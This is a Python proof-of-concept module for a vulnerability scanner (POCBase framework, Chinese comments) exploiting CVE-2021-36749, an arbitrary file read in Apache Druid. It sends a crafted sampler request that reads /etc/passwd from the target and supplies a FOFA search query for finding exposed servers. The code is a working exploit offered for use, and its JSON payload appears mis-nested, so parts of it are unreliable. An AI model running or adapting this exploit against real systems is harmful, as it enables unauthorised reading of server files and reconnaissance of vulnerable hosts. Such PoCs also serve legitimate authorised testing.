# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Apache Druid任意文件读取复现(CVE-2021-36749)",                        # 漏洞名称
        "VulnID" : "CVE-2021-36749",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Apache Druid",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            Apache Druid 是一个集时间序列数据库、数据仓库和全文检索系统特点于一体的分析性数据平台。  
            
            Apache Druid对用户指定的HTTP InputSource没有做限制，并且Apache Druid默认管理页面是不需要认证即可访问的。
            因此未经授权的远程攻击者可以通过构造恶意参数读取服务器上的任意文件。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="APACHE-Druid"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/druid/indexer/v1/sampler" # url自己按需调整
        data = """
{
  "type": "index",
  "spec": {
    "ioConfig": {
      "type": "index",
      "inputSource": {
        "type": "local",
        "baseDir": "/etc/",
        "filter": "passwd"
      },
      "inputFormat": {
        "type": "json",
        "keepNullColumns": true
      }
    },
    "dataSchema": {
      "dataSource": "sample",
      "timestampSpec": {
        "column": "timestamp",
        "format": "iso",
        "missingValue": "1970"
      },
      "dimensionsSpec": {}
    }
  },
  "type": "index",
  "tuningConfig": {
    "type": "index"
  }
},
  "samplerConfig": {
    "numRows": 500,
    "timeoutMs": 15000
  }
}"""

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/json",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "root:/root" in req.text:#req.status_code == 200 and :
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()